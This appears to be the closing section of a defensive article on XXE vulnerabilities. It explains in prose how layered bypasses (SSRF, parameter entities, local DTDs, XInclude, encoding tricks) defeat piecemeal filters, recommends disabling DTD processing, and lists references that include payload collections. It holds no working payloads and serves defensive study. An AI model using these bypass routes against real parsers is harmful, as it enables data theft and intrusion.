**Incremental patches fail** because the attack surface is distributed across multiple dimensions simultaneously. Blocking `file://` still leaves `http://` SSRF. Blocking external entities still leaves parameter entities in external DTDs. Disabling external DTDs still leaves local DTD repurposing. Blocking DOCTYPE declarations still leaves XInclude. Filtering keywords is defeated by encoding mutations. Each defense addresses one mutation axis while leaving others open. This is why the vulnerability persists decades after its initial discovery — the combinatorial explosion of entity types, DTD sources, protocol handlers, carrier formats, and encoding layers creates a mutation space that point-fixes cannot fully cover.

**The structural solution** is a single, universal principle: **disable DTD processing entirely** at the parser level before processing any untrusted XML. Modern applications should use XSD (XML Schema Definition) for validation instead of DTDs, and XML parsers should be configured to reject DOCTYPE declarations outright. This eliminates the root cause — entity declaration — rather than attempting to filter its infinite variations. Every major language and framework now supports this configuration, and newer parser versions increasingly default to safe behavior (PHP 8.0+, .NET 4.5.2+, lxml 3.x+). The remaining risk concentrates in legacy applications, hidden XML parsing surfaces (document converters, file upload processors, PDF parsers), and misconfigured parser options that re-enable entity processing.

---

## References

- OWASP XML External Entity Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy — XXE: https://portswigger.net/web-security/xxe
- PortSwigger Web Security Academy — Blind XXE: https://portswigger.net/web-security/xxe/blind
- HackTricks XXE Reference: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- PayloadsAllTheThings XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- GoSecure Advanced XXE Workshop: https://gosecure.github.io/xxe-workshop/
- Wallarm XXE WAF Bypass: https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/
- Assetnote — CVE-2024-34102 CosmicSting Analysis: https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102
- ZDI — CVE-2024-30043 SharePoint XXE: https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud
- Akamai — CVE-2025-66516 Apache Tika XXE: https://www.akamai.com/blog/security-research/cve-2025-66516-detecting-defending-apache-tika-xxe-attack
- HackerOne XXE Complete Guide: https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention
- Sonarsource — How to disable XXE processing: https://www.sonarsource.com/blog/secure-xml-processor/

---

*This document was created for defensive security research and vulnerability understanding purposes.*
